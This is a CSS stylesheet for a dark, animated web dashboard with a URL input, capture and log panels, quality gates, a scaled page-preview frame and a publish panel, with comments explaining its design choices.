  --a2:#22d3ee;          /* cyan — live, links, the press */
  --a3:#f472b6;          /* pink — captures */
  /* the same three as channel triplets: every translucent edge in this sheet is
     rgba(var(--aN-rgb), alpha), so a palette change recolours the glow too —
     a hex swap that leaves the shadows violet looks like a bug, not a theme. */
  --a1-rgb:124,92,255;
  --a2-rgb:34,211,238;
  --a3-rgb:244,114,182;
  /* the operator's own wallpaper, set from /api/theme/wall */
  --wall:none;
  --wall-a:0;
  --wall-dim:.36;
  --ok:#34e5a0;
  --bad:#ff6b8a;
  --warn:#ffc35a;
  --r1:10px;--r2:14px;--r3:20px;--r4:26px;
  --sans:"Inter Tight","Inter",system-ui,sans-serif;
  --mono:"IBM Plex Mono",ui-monospace,monospace;
  --rise:cubic-bezier(.22,.75,.2,1);
}
body{
  margin:0;min-height:100vh;background:var(--bg);color:var(--ink);
  font:400 14px/1.55 var(--sans);letter-spacing:-.005em;
  -webkit-font-smoothing:antialiased;overflow-x:hidden;
}

/* ── the wall ─────────────────────────────────────────────────────────── */
/* the operator's own image, behind everything, with a scrim the theme slider
   owns: a photograph that keeps its contrast and a console that keeps its
   legible text are the same problem, and the scrim is the answer */
.wall{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:var(--wall-a);
  background:var(--wall) center/cover no-repeat;transform:scale(1.06);
  transition:opacity .7s var(--rise),background-image .4s}
.wall::after{content:"";position:absolute;inset:0;background:#04060d;opacity:var(--wall-dim)}
body.walled .aurora{opacity:.5}
/* a photograph is not a dark surface: the glass has to get darker before the
   faint greys of the chrome stay readable on top of it. the alpha here is the
   difference between a console and a pile of labels over a picture */
body.walled .card{background:linear-gradient(180deg,rgba(9,11,20,.94),rgba(6,8,16,.88))}
body.walled .notes div,body.walled .stat,body.walled .idle-grid div,
body.walled .panel,body.walled .hit,body.walled .gate{background:rgba(6,8,16,.9)}
/* the footer is the one line of chrome that sits straight on the photograph, so
   it gets a band of its own that fades up out of the picture */
body.walled footer{color:var(--mute);border-top-color:rgba(255,255,255,.14);
  border-radius:0 0 12px 12px;padding:16px 10px 6px;
  background:linear-gradient(180deg,rgba(4,6,13,0),rgba(4,6,13,.78));
  text-shadow:0 1px 3px rgba(0,0,0,.85)}
/* and the header does the same job with a shadow: a caption over bright sky is
   unreadable long before the same caption over a dark card is */
body.walled header.top{text-shadow:0 1px 4px rgba(0,0,0,.9)}

/* ── the moving sky ───────────────────────────────────────────────────── */
/* clipped to the viewport: blobs that hang outside it widen the document and
   give a phone a horizontal scrollbar it has no use for */
.aurora{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;
  transition:opacity .7s var(--rise)}
.aurora i{position:absolute;display:block;border-radius:50%;filter:blur(90px);opacity:.62;
  animation:drift 26s var(--rise) infinite alternate}
.aurora i:nth-child(1){width:52vmax;height:52vmax;left:-6vmax;top:-8vmax;
  background:radial-gradient(circle,var(--a1) 0%,transparent 62%)}
.aurora i:nth-child(2){width:46vmax;height:46vmax;right:-10vmax;top:6vmax;
  background:radial-gradient(circle,var(--a2) 0%,transparent 62%);animation-duration:31s;
  animation-delay:-6s}
.aurora i:nth-child(3){width:40vmax;height:40vmax;left:24vmax;bottom:-16vmax;
  background:radial-gradient(circle,var(--a3) 0%,transparent 64%);opacity:.32;
  animation-duration:37s;animation-delay:-12s}
.aurora i:nth-child(4){width:34vmax;height:34vmax;right:8vmax;bottom:-10vmax;
  background:radial-gradient(circle,var(--a1) 0%,transparent 60%);opacity:.28;
  animation-duration:44s;animation-delay:-3s}
.aurora::after{content:"";position:absolute;inset:0;
  background:
    linear-gradient(rgba(255,255,255,.028) 1px,transparent 1px) 0 0/64px 64px,
    linear-gradient(90deg,rgba(255,255,255,.028) 1px,transparent 1px) 0 0/64px 64px;
  mask-image:radial-gradient(ellipse at 50% 0%,#000 10%,transparent 72%);
  animation:slide 24s linear infinite}
@keyframes drift{
  0%{transform:translate3d(0,0,0) scale(1)}
  50%{transform:translate3d(4%,-4%,0) scale(1.14)}
  100%{transform:translate3d(-3%,3%,0) scale(1.06)}
}
@keyframes slide{to{background-position:64px 64px,64px 64px}}

/* ── shell ────────────────────────────────────────────────────────────── */
.app{position:relative;z-index:1;max-width:1440px;margin:0 auto;padding:20px 22px 30px}

header.top{display:flex;align-items:center;gap:14px;padding:6px 4px 18px}
.brand{display:flex;align-items:center;gap:11px;text-decoration:none;color:inherit}
.brand .mark{position:relative;width:26px;height:26px;border-radius:9px;flex:0 0 auto;
  background:conic-gradient(from 140deg,var(--a1),var(--a2),var(--a3),var(--a1));
  box-shadow:0 0 22px -4px rgba(var(--a1-rgb),.8);animation:spin 9s linear infinite}
.brand .mark::after{content:"";position:absolute;inset:2px;border-radius:7px;background:#070912}
.brand .bt{display:flex;flex-direction:column;line-height:1.05}
.brand .word{font-size:15px;font-weight:650;letter-spacing:.16em;text-transform:uppercase}
.brand .tag{font-family:var(--mono);font-size:8.5px;letter-spacing:.2em;text-transform:uppercase;
  color:var(--faint);margin-top:4px}
@keyframes spin{to{transform:rotate(360deg)}}

.top-right{display:flex;align-items:center;gap:7px;margin-left:auto;flex-wrap:wrap}

.chip{display:inline-flex;align-items:center;gap:7px;height:28px;padding:0 11px;border-radius:999px;
  border:1px solid var(--line);background:var(--glass);backdrop-filter:blur(12px);
  font-family:var(--mono);font-size:9px;letter-spacing:.13em;text-transform:uppercase;
  color:var(--mute);text-decoration:none;white-space:nowrap;transition:.25s var(--rise)}
.chip i{width:6px;height:6px;border-radius:50%;background:var(--dim);flex:0 0 auto;transition:.3s}
.chip.ok{color:#a9f5d3;border-color:rgba(52,229,160,.34);background:rgba(52,229,160,.08);
  box-shadow:0 0 20px -8px rgba(52,229,160,.8)}
.chip.ok i{background:var(--ok);box-shadow:0 0 0 0 rgba(52,229,160,.6);animation:ping 2.4s ease-out infinite}
.chip.bad{color:#ffb3c2;border-color:rgba(255,107,138,.32);background:rgba(255,107,138,.07)}
.chip.bad i{background:var(--bad)}
.chip.cap{color:#ffd0e4;border-color:rgba(var(--a3-rgb),.4);background:rgba(var(--a3-rgb),.1);
  box-shadow:0 0 24px -8px rgba(var(--a3-rgb),.9)}
.chip.cap i{background:var(--a3);animation:ping 1.8s ease-out infinite}
.chip[hidden]{display:none}
@keyframes ping{0%{box-shadow:0 0 0 0 rgba(255,255,255,.45)}70%{box-shadow:0 0 0 7px transparent}
  100%{box-shadow:0 0 0 0 transparent}}

.ghost{display:inline-flex;align-items:center;justify-content:center;height:32px;padding:0 13px;
  border-radius:999px;border:1px solid var(--line2);background:var(--glass);color:var(--ink);
  font-family:var(--mono);font-size:9.5px;letter-spacing:.14em;text-transform:uppercase;
  text-decoration:none;cursor:pointer;transition:.22s var(--rise)}
.ghost:hover{background:var(--glass2);border-color:rgba(255,255,255,.26);transform:translateY(-1px)}
.ghost:disabled{opacity:.38;cursor:not-allowed;transform:none}
.ghost.warm{color:#ffe0b0;border-color:rgba(255,195,90,.28)}
.ghost.warm:hover{background:rgba(255,195,90,.1)}

.primary{position:relative;display:inline-flex;align-items:center;justify-content:center;
  height:46px;padding:0 26px;border:0;border-radius:var(--r2);cursor:pointer;
  color:#06070f;font:650 12px/1 var(--sans);letter-spacing:.14em;text-transform:uppercase;
  background:linear-gradient(115deg,var(--a1),color-mix(in oklab,var(--a2) 72%,#fff) 44%,var(--a2));
  box-shadow:0 12px 34px -14px rgba(70,130,255,.95),inset 0 1px 0 rgba(255,255,255,.4);
  overflow:hidden;transition:transform .22s var(--rise),box-shadow .25s}
.primary::after{content:"";position:absolute;inset:0;
  background:linear-gradient(105deg,transparent 30%,rgba(255,255,255,.55) 48%,transparent 62%);
  transform:translateX(-120%);animation:sheen 5.5s ease-in-out infinite}
.primary:hover{transform:translateY(-2px) scale(1.012);
  box-shadow:0 18px 42px -14px rgba(70,130,255,1),inset 0 1px 0 rgba(255,255,255,.5)}
.primary:active{transform:translateY(0) scale(.995)}
.primary:disabled{opacity:.5;cursor:progress;transform:none}
.primary.sm{height:38px;padding:0 18px;border-radius:11px;font-size:11px}
@keyframes sheen{0%,72%{transform:translateX(-120%)}88%{transform:translateX(120%)}100%{transform:translateX(120%)}}

/* ── grid ─────────────────────────────────────────────────────────────── */
/* both columns stretch to the taller one: a short right-hand card floating
   beside a tall rail is what makes a dashboard look half-finished. */
.grid{display:grid;grid-template-columns:minmax(348px,392px) minmax(0,1fr);gap:16px;
  align-items:stretch}

.card{
  position:relative;padding:22px;border-radius:var(--r3);
  border:1px solid var(--line);
  background:linear-gradient(180deg,rgba(255,255,255,.072),rgba(255,255,255,.026));
  backdrop-filter:blur(22px) saturate(150%);
  box-shadow:0 30px 70px -46px #000,inset 0 1px 0 rgba(255,255,255,.09);
  transition:transform .3s var(--rise),box-shadow .3s,border-color .3s;
}
.card:hover{border-color:rgba(255,255,255,.18);
  box-shadow:0 40px 80px -50px #000,inset 0 1px 0 rgba(255,255,255,.11)}
.card.edge::before{content:"";position:absolute;inset:-1px;border-radius:inherit;padding:1px;
  background:conic-gradient(from 0deg,transparent 0 55%,rgba(var(--a1-rgb),.75) 70%,
    rgba(var(--a2-rgb),.75) 84%,transparent 96%);
  -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
  -webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none;
  animation:spin 14s linear infinite;opacity:.85}
.rail{display:flex;flex-direction:column;gap:16px;min-width:0}
.rail > .card{position:sticky;top:16px}
.stage{display:flex;flex-direction:column;gap:16px;min-width:0}
.stage > .notes{margin-top:auto}

.kicker{display:flex;align-items:center;gap:9px;margin:0 0 16px;
  font-family:var(--mono);font-size:9px;letter-spacing:.24em;text-transform:uppercase;color:var(--faint)}
.kicker b{font-weight:500;color:var(--a2)}
.kicker::after{content:"";flex:1;height:1px;
  background:linear-gradient(90deg,var(--line2),transparent)}

h1.hl{margin:0 0 10px;font-size:clamp(26px,2.5vw,34px);line-height:1.06;
  font-weight:640;letter-spacing:-.035em}
.grad{background:linear-gradient(100deg,var(--a1) 6%,var(--a2) 52%,var(--a3) 96%);
  -webkit-background-clip:text;background-clip:text;color:transparent;
  background-size:220% 100%;animation:hue 9s ease-in-out infinite alternate}
@keyframes hue{to{background-position:100% 0}}
.sub{margin:0 0 18px;color:var(--mute);font-size:12.5px;line-height:1.6;max-width:42ch}

/* ── url dock ─────────────────────────────────────────────────────────── */
.dock{display:flex;gap:9px;align-items:stretch}
.input-wrap{position:relative;flex:1;display:flex;align-items:center;min-width:0;
  height:46px;padding:0 13px;border-radius:var(--r2);border:1px solid var(--line2);
  background:rgba(6,8,16,.72);transition:.25s var(--rise)}
.input-wrap:focus-within{border-color:rgba(var(--a2-rgb),.6);
  box-shadow:0 0 0 3px rgba(var(--a2-rgb),.14),0 0 30px -12px rgba(var(--a2-rgb),.7)}
.scheme{font-family:var(--mono);font-size:11px;color:var(--dim);user-select:none}
#url{flex:1;min-width:0;height:100%;border:0;background:transparent;color:var(--ink);
  font-family:var(--mono);font-size:12px;outline:none}
#url::placeholder{color:var(--dim)}

.opts{display:flex;align-items:center;gap:7px;flex-wrap:wrap;margin:13px 0 0}
.pill{position:relative;display:inline-flex;align-items:center;gap:7px;height:29px;padding:0 12px;
  border-radius:999px;border:1px solid var(--line);background:var(--glass);
  font-family:var(--mono);font-size:9px;letter-spacing:.12em;text-transform:uppercase;
  color:var(--faint);cursor:pointer;user-select:none;transition:.25s var(--rise)}
.pill:hover{color:var(--mute);border-color:var(--line2)}
.pill input{position:absolute;inset:0;width:100%;height:100%;margin:0;opacity:0;cursor:pointer}
.pill .nub{width:6px;height:6px;border-radius:50%;background:var(--dim);transition:.25s}
.pill.on{color:#dbe6ff;border-color:rgba(var(--a1-rgb),.45);background:rgba(var(--a1-rgb),.14);
  box-shadow:0 0 22px -10px rgba(var(--a1-rgb),.9)}
.pill.on .nub{background:var(--a1);box-shadow:0 0 8px var(--a1)}
.pill.accent.on{border-color:rgba(var(--a2-rgb),.5);background:rgba(var(--a2-rgb),.13);
  box-shadow:0 0 24px -10px rgba(var(--a2-rgb),.95)}
.pill.accent.on .nub{background:var(--a2);box-shadow:0 0 9px var(--a2)}
.adv-toggle{margin-left:auto;border:0;background:transparent;cursor:pointer;
  font-family:var(--mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;
  color:var(--faint);transition:.2s}
.adv-toggle:hover{color:var(--a2)}

.adv{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px;margin:13px 0 0;
  animation:rise .45s var(--rise) both}
label{position:relative;display:block;font-family:var(--mono);font-size:8.5px;letter-spacing:.17em;
  text-transform:uppercase;color:var(--faint)}
label input,label select{display:block;width:100%;height:34px;margin-top:6px;padding:0 10px;
  border-radius:var(--r1);border:1px solid var(--line);background:rgba(6,8,16,.72);
  color:var(--ink);font-family:var(--mono);font-size:11px;outline:none;transition:.2s}
label select{appearance:none;cursor:pointer}
label input:focus,label select:focus{border-color:rgba(var(--a2-rgb),.55);
  box-shadow:0 0 0 3px rgba(var(--a2-rgb),.12)}
label input::placeholder{color:var(--dim)}

/* ── capture ──────────────────────────────────────────────────────────── */
.capture{margin:16px 0 0;padding:14px;border-radius:var(--r2);
  border:1px solid rgba(255,195,90,.16);
  background:linear-gradient(160deg,rgba(255,195,90,.07),rgba(255,195,90,.015))}
.cap-head{display:flex;align-items:center;justify-content:space-between;margin:0 0 10px;
  font-family:var(--mono);font-size:8.5px;letter-spacing:.2em;text-transform:uppercase;
  color:rgba(255,205,120,.72)}
.cap-head .mini{color:var(--faint)}
.cap-grid{display:grid;grid-template-columns:1fr;gap:10px}
.cap-note{margin:11px 0 0;font-size:11px;line-height:1.6;color:var(--faint)}
.cap-note b{color:#ffd79a;font-weight:500}
.capture.armed{border-color:rgba(255,195,90,.45);
  box-shadow:0 0 40px -22px rgba(255,195,90,.9)}
.capture.armed .cap-head{color:var(--warn)}

.stats{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:1px;margin:16px 0 0;
  border-radius:var(--r2);overflow:hidden;border:1px solid var(--line);background:var(--line)}
.stat{display:flex;flex-direction:column;gap:3px;padding:11px 13px;background:rgba(8,10,20,.72)}
.stat b{font-family:var(--mono);font-size:14px;font-weight:500;color:var(--ink)}
.stat span{font-family:var(--mono);font-size:8px;letter-spacing:.14em;text-transform:uppercase;
  color:var(--faint)}

/* ── idle ─────────────────────────────────────────────────────────────── */
.idle{flex:1 1 auto;display:flex;flex-direction:column}
.idle-h{margin:0 0 8px;font-size:22px;font-weight:620;letter-spacing:-.03em}
.idle-p{margin:0 0 18px;max-width:54ch;color:var(--mute);font-size:12.5px;line-height:1.65}
.idle-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:1px;
  border-radius:var(--r2);overflow:hidden;border:1px solid var(--line);background:var(--line)}
.idle-grid div{display:flex;flex-direction:column;gap:3px;padding:12px 14px;
  background:rgba(8,10,20,.62)}
.idle-grid b{font-family:var(--mono);font-size:8.5px;letter-spacing:.18em;text-transform:uppercase;
  color:var(--a2);font-weight:500}
.idle-grid span{font-size:11.5px;line-height:1.5;color:var(--faint)}
.idle-foot{margin:auto 0 0;padding-top:14px;display:flex;flex-direction:column;gap:5px;
  border-top:1px solid var(--line)}
.idle-foot div{display:grid;grid-template-columns:84px minmax(0,1fr);gap:12px;align-items:baseline}
.idle-foot b{font-family:var(--mono);font-size:8px;letter-spacing:.16em;text-transform:uppercase;
  color:var(--dim);font-weight:400}
.idle-foot code{font-family:var(--mono);font-size:10px;color:var(--mute);word-break:normal;
  overflow-wrap:anywhere}
/* the middle of an idle card is dead space unless something in it moves; two
   rings and a breathing dot carry the weight with no copy at all */
.core{position:relative;flex:1 1 auto;display:grid;place-items:center;min-height:180px;padding:12px 0}
.core i{position:absolute;border-radius:50%;border:1px solid rgba(var(--a1-rgb),.34)}
.core i:nth-child(1){width:134px;height:134px;border-style:dashed;
  box-shadow:0 0 44px -18px rgba(var(--a1-rgb),.9);animation:spin 18s linear infinite}
.core i:nth-child(2){width:190px;height:190px;border-color:rgba(var(--a2-rgb),.2);
  animation:spin 30s linear infinite reverse}
.core span{width:9px;height:9px;border-radius:50%;background:radial-gradient(circle,#fff,var(--a2));
  box-shadow:0 0 22px 3px rgba(var(--a2-rgb),.85);animation:breathe 3.4s ease-in-out infinite}
@keyframes breathe{0%,100%{transform:scale(.78);opacity:.65}50%{transform:scale(1.3);opacity:1}}

/* ── console ──────────────────────────────────────────────────────────── */
.console-head{display:flex;align-items:flex-start;gap:16px;justify-content:space-between;
  flex-wrap:wrap}
.console-head .kicker{margin-bottom:0;flex:1 1 220px}
.live{display:inline-flex;align-items:center;gap:6px;margin-left:6px;
  font-family:var(--mono);font-size:9px;letter-spacing:.1em;color:var(--faint);text-transform:none}
.live code{color:var(--mute);font-size:9.5px}
.counters{display:flex;gap:18px}
.counters div{display:flex;flex-direction:column;align-items:flex-end;min-width:46px}
.counters b{font-family:var(--mono);font-size:16px;font-weight:500;color:var(--ink);
  transition:color .3s}
.counters span{font-family:var(--mono);font-size:8px;letter-spacing:.16em;text-transform:uppercase;
  color:var(--dim)}

.phases{display:flex;gap:4px;margin:18px 0 10px}
.ph{flex:1 1 0;padding:8px 4px;border-radius:9px;text-align:center;
  font-family:var(--mono);font-size:8px;letter-spacing:.13em;text-transform:uppercase;
  color:var(--dim);background:rgba(255,255,255,.022);transition:.35s var(--rise);
  border:1px solid transparent;overflow:hidden;white-space:nowrap}
.ph.done{color:#a9f5d3;background:rgba(52,229,160,.08);border-color:rgba(52,229,160,.2)}
.ph.now{color:#0a0b12;
  background:linear-gradient(100deg,var(--a2),color-mix(in oklab,var(--a2) 58%,#fff));
  box-shadow:0 0 26px -8px rgba(var(--a2-rgb),.95);font-weight:600}
.track{height:3px;border-radius:9px;background:rgba(255,255,255,.07);overflow:hidden}
.track i{display:block;height:100%;width:5%;border-radius:9px;
  background:linear-gradient(90deg,var(--a1),var(--a2),var(--a3));
  transition:width .7s var(--rise);box-shadow:0 0 14px rgba(var(--a2-rgb),.8)}

.panels{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.1fr);gap:1px;margin:16px 0 0;
  border:1px solid var(--line);border-radius:var(--r2);overflow:hidden;background:var(--line)}
.panel{display:flex;flex-direction:column;background:rgba(6,8,16,.62);min-width:0}
.panel-head{display:flex;align-items:center;justify-content:space-between;gap:10px;
  padding:9px 12px;border-bottom:1px solid var(--line);
  font-family:var(--mono);font-size:8.5px;letter-spacing:.18em;text-transform:uppercase;
  color:var(--faint)}
#log-filter{width:96px;height:24px;padding:0 8px;border-radius:7px;border:1px solid var(--line);
  background:rgba(255,255,255,.03);color:var(--ink);font-family:var(--mono);font-size:9.5px;
  letter-spacing:.04em;text-transform:none;outline:none;transition:.2s}
#log-filter:focus{border-color:rgba(var(--a2-rgb),.5)}
#discovery{list-style:none;margin:0;padding:6px;height:268px;overflow:auto}
#discovery li{display:flex;align-items:center;gap:8px;padding:4px 6px;border-radius:7px;
  font-family:var(--mono);font-size:10px;color:var(--mute);animation:rise .35s var(--rise) both}
#discovery li:hover{background:rgba(255,255,255,.035)}
.sdot{width:6px;height:6px;border-radius:50%;background:var(--dim);flex:0 0 auto}
.sdot.done{background:var(--ok);box-shadow:0 0 8px rgba(52,229,160,.9)}
.sdot.downloading,.sdot.pending{background:var(--a2);animation:ping 1.4s ease-out infinite}
.sdot.failed{background:var(--bad)}
.sdot.placeholder{background:var(--warn)}
.u{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sz{color:var(--dim);font-size:9px;flex:0 0 auto}
.log{height:268px;overflow:auto;padding:8px 12px;font-family:var(--mono);font-size:10.5px;
  line-height:1.75;color:var(--mute)}
.log div{animation:rise .3s var(--rise) both;word-break:break-word}
.log .t{color:var(--dim);margin-right:8px}
.log .ok{color:#9df0cb}
.log .warn{color:#ffd08a}
.log .error{color:#ff9fb1}
.log .info{color:var(--mute)}

/* ── gates ────────────────────────────────────────────────────────────── */
.gates{display:grid;grid-template-columns:repeat(6,minmax(0,1fr));gap:8px}
.gate{position:relative;display:flex;flex-direction:column;gap:6px;padding:11px 12px;
  border-radius:var(--r1);border:1px solid var(--line);background:rgba(255,255,255,.025);
  overflow:hidden;transition:.4s var(--rise)}
.gate .name{font-family:var(--mono);font-size:8px;letter-spacing:.16em;text-transform:uppercase;
  color:var(--faint)}
.gate .val{font-family:var(--mono);font-size:15px;font-weight:500;color:var(--mute)}
.gate .bar-mini{height:2px;border-radius:9px;background:rgba(255,255,255,.08);overflow:hidden}
.gate .bar-mini i{display:block;height:100%;width:0;border-radius:9px;background:var(--a2);
  transition:width .9s var(--rise)}
.gate.pass{border-color:rgba(52,229,160,.32);background:rgba(52,229,160,.07);
  box-shadow:0 0 34px -20px rgba(52,229,160,.9)}
.gate.pass .val{color:#a9f5d3}
.gate.pass .bar-mini i{background:var(--ok)}
.gate.fail{border-color:rgba(255,107,138,.32);background:rgba(255,107,138,.07)}
.gate.fail .val{color:#ffb3c2}
.gate.fail .bar-mini i{background:var(--bad)}
.gate.measuring .bar-mini i{background:var(--a1);animation:pulse 1.2s ease-in-out infinite}
@keyframes pulse{50%{opacity:.35}}

.timeline{display:flex;flex-direction:column;gap:6px;margin:14px 0 0;max-height:220px;overflow:auto}
.tl-empty{font-family:var(--mono);font-size:10px;color:var(--dim);padding:8px 2px}
details.tl{border-radius:var(--r1);border:1px solid var(--line);background:rgba(255,255,255,.025);
  animation:rise .4s var(--rise) both}
details.tl summary{display:flex;align-items:center;gap:9px;padding:5px 10px;cursor:pointer;
  font-family:var(--mono);font-size:10px;color:var(--mute);list-style:none}
details.tl summary::-webkit-details-marker{display:none}
details.tl summary .it{color:var(--a2);flex:0 0 auto}
details.tl summary .g{color:var(--a3);flex:0 0 auto}
details.tl summary .ar{color:var(--dim)}
details.tl .body{padding:2px 12px 10px;border-top:1px solid var(--line)}
details.tl dl{display:grid;grid-template-columns:74px minmax(0,1fr);gap:3px 10px;margin:8px 0 0;
  font-family:var(--mono);font-size:10px}
details.tl dt{color:var(--dim);text-transform:uppercase;letter-spacing:.1em;font-size:8.5px}
details.tl dd{margin:0;color:var(--mute)}

/* ── result ───────────────────────────────────────────────────────────── */
/* the preview runs the full width of the card underneath the ship details:
   squeezed into a side column a 1440px page is a 35% thumbnail and nothing in
   it can be read */
.result-main{display:flex;flex-direction:column;gap:12px;min-width:0}
.badge{align-self:flex-start;display:inline-flex;align-items:center;gap:7px;height:26px;padding:0 11px;
  border-radius:999px;border:1px solid var(--line2);background:var(--glass);
  font-family:var(--mono);font-size:8.5px;letter-spacing:.2em;text-transform:uppercase;
  color:var(--mute)}
.badge.live{color:#0a0b12;border-color:transparent;
  background:linear-gradient(100deg,var(--a2),color-mix(in oklab,var(--a2) 58%,#fff));
  box-shadow:0 0 30px -10px rgba(var(--a2-rgb),.95);animation:glow 2.6s ease-in-out infinite}
.badge.dead{color:#ffb3c2;border-color:rgba(255,107,138,.35);background:rgba(255,107,138,.08)}
@keyframes glow{50%{box-shadow:0 0 44px -6px rgba(var(--a2-rgb),1)}}
#result h3{margin:0;font-size:21px;font-weight:620;letter-spacing:-.03em}
#result-note{margin:0;font-size:11px;line-height:1.6;color:var(--faint);text-transform:none;
  letter-spacing:.02em}

.publish{margin:4px 0 0;padding:14px;border-radius:var(--r2);border:1px solid var(--line);
  background:rgba(6,8,16,.55);transition:.4s var(--rise)}
.publish.up{border-color:rgba(var(--a2-rgb),.4);box-shadow:0 0 50px -26px rgba(var(--a2-rgb),.95);
  background:rgba(var(--a2-rgb),.05)}
.publish-head{display:flex;align-items:center;justify-content:space-between;margin:0 0 9px;
  font-family:var(--mono);font-size:8.5px;letter-spacing:.2em;text-transform:uppercase;
  color:var(--faint)}
.pub-out{display:block;padding:10px 12px;border-radius:var(--r1);border:1px solid var(--line);
  background:rgba(0,0,0,.42);text-decoration:none;overflow:hidden;transition:.3s}
.pub-out:hover{border-color:var(--line2)}
#pub-url{display:block;font-family:var(--mono);font-size:11.5px;color:var(--faint);
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
#pub-url.live{color:var(--a2)}
#pub-url.gone{color:var(--bad)}
.publish-row{display:flex;align-items:center;gap:7px;margin-top:10px;flex-wrap:wrap}
#pub-note{margin:10px 0 0;font-size:9px;line-height:1.6;color:var(--faint);text-transform:none;
  letter-spacing:.04em}
.mini{font-family:var(--mono);font-size:9px;letter-spacing:.08em;text-transform:none;color:var(--faint)}
.mini.ok{color:#9df0cb}
.mini.bad{color:#ff9fb1}

.urlrow{display:flex;align-items:center;gap:9px;padding:9px 12px;border-radius:var(--r1);
  border:1px solid var(--line);background:rgba(6,8,16,.55);flex-wrap:wrap}
.urlrow .tag{font-family:var(--mono);font-size:8.5px;letter-spacing:.18em;text-transform:uppercase;
  color:var(--dim);flex:0 0 auto}
.urlrow code{flex:1;min-width:0;font-family:var(--mono);font-size:11px;color:var(--mute);
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap}

.preview{display:flex;flex-direction:column;gap:9px;min-width:0;margin-top:20px}
.vp-switch{display:flex;gap:3px;padding:3px;border-radius:11px;border:1px solid var(--line);
  background:rgba(6,8,16,.6)}
.vp-switch button{flex:1;height:27px;border:0;border-radius:8px;background:transparent;
  color:var(--faint);font-family:var(--mono);font-size:8.5px;letter-spacing:.13em;
  text-transform:uppercase;cursor:pointer;transition:.25s var(--rise)}
.vp-switch button:hover{color:var(--mute)}
.vp-switch button.on{color:#0a0b12;background:linear-gradient(100deg,var(--a1),var(--a2));
  box-shadow:0 0 22px -10px rgba(var(--a2-rgb),.95)}
/* 52vh keeps a desktop page near full width inside the stage instead of
   height-limited to a thumbnail */
.frame-wrap{position:relative;height:clamp(360px,52vh,600px);border-radius:var(--r2);border:1px solid var(--line2);
  background:radial-gradient(circle at 50% 0%,rgba(var(--a1-rgb),.13),transparent 60%),#05070e;
  overflow:hidden}
.frame-wrap::before{content:"";position:absolute;inset:0;pointer-events:none;
  background:linear-gradient(180deg,rgba(255,255,255,.05),transparent 22%);z-index:2}
/* the preview is a stage, not a box: the page is laid out at its real viewport
   size and then scaled down whole, so nothing is cropped and nothing scrolls. */
.device{position:absolute;top:50%;left:50%;transform-origin:50% 50%;transform:translate(-50%,-50%);
  width:1440px;height:900px;
  border-radius:8px;overflow:hidden;background:#fff;
  box-shadow:0 30px 60px -30px rgba(0,0,0,.9),0 0 0 1px rgba(255,255,255,.09);
  transition:transform .5s var(--rise),width .5s var(--rise),height .5s var(--rise)}
#frame{display:block;width:100%;height:100%;border:0;background:#fff}

/* ── captures ─────────────────────────────────────────────────────────── */
.hits-head{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
.hits-head .kicker{margin-bottom:0}
.hits-tools{display:flex;align-items:center;gap:10px}
#hit-count{font-family:var(--mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;
  color:var(--a3)}
.hits{display:flex;flex-direction:column;margin:14px 0 0;border-radius:var(--r2);overflow:hidden;
  border:1px solid var(--line);background:var(--line);gap:1px}
.hit-empty{padding:16px;background:rgba(6,8,16,.62);font-family:var(--mono);font-size:10.5px;
  color:var(--dim)}
.hit{display:grid;grid-template-columns:64px minmax(0,1fr) auto;gap:12px;align-items:center;
  padding:11px 14px;background:rgba(8,10,20,.78);animation:rise .4s var(--rise) both}
.hit .when{font-family:var(--mono);font-size:9.5px;color:var(--dim)}
.hit .who{display:flex;flex-direction:column;gap:2px;min-width:0}
.hit .who b{font-size:12.5px;font-weight:560;color:var(--ink);overflow:hidden;
  text-overflow:ellipsis;white-space:nowrap}
.hit .who span{font-family:var(--mono);font-size:9px;color:var(--faint);overflow:hidden;
  text-overflow:ellipsis;white-space:nowrap}
.hit .key{font-family:var(--mono);font-size:11px;color:var(--a3);padding:4px 10px;border-radius:8px;
  background:rgba(var(--a3-rgb),.1);border:1px solid rgba(var(--a3-rgb),.22)}

/* ── notes + footer ───────────────────────────────────────────────────── */
.notes{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px;margin-top:4px}
.notes div{display:flex;flex-direction:column;gap:4px;padding:12px 14px;border-radius:var(--r2);
  border:1px solid var(--line);background:var(--glass);backdrop-filter:blur(14px);
  transition:.3s var(--rise)}
.notes div:hover{transform:translateY(-2px);border-color:var(--line2)}
.notes b{font-family:var(--mono);font-size:8px;letter-spacing:.18em;text-transform:uppercase;
  color:var(--a2);font-weight:500}
.notes span{font-size:11.5px;line-height:1.55;color:var(--faint)}

footer{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;
  margin:22px 0 0;padding:14px 4px 0;border-top:1px solid var(--line);
  font-family:var(--mono);font-size:8.5px;letter-spacing:.14em;text-transform:uppercase;
  color:var(--dim)}
footer b{color:var(--faint);font-weight:500}
/* the house mark: the one piece of copy on the page that is not about the job */
footer .credit b{color:var(--ink);font-weight:650;letter-spacing:.18em}
footer .credit b::before{content:"";display:inline-block;width:6px;height:6px;margin:0 8px 1px 0;
  border-radius:50%;background:linear-gradient(135deg,var(--a1),var(--a2));
  box-shadow:0 0 10px -1px var(--a2)}

/* ── settings sheet ───────────────────────────────────────────────────── */
#settings{position:fixed;inset:0;z-index:60;display:flex;align-items:flex-start;justify-content:flex-end;
  padding:22px;background:rgba(3,4,10,.62);backdrop-filter:blur(8px);
  animation:fade .3s var(--rise) both}
#settings.hidden{display:none}
.sheet{position:relative;width:min(430px,100%);max-height:calc(100vh - 44px);overflow:auto;
  padding:22px;border-radius:var(--r3);border:1px solid var(--line2);
  background:linear-gradient(180deg,rgba(20,24,40,.96),rgba(10,12,22,.97));
